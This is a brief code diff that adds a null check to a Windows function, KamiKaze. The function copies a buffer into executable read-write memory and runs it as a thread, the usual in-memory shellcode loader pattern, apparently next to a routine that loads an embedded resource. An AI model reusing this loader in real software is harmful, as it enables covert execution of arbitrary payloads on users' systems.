@@ -226,6 +226,8 @@ HGLOBAL LoadExbff(int i, LPCSTR lpName)
 
 void KamiKaze(DWORD size,void *src)
 {
+    if (!src)
+        return ;
     void* buff = VirtualAlloc(0, (SIZE_T)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy_s(buff,size,src,size);
     CreateRemoteThread(GetCurrentProcess(), NULL, size, (LPTHREAD_START_ROUTINE)buff, NULL, NULL, NULL);
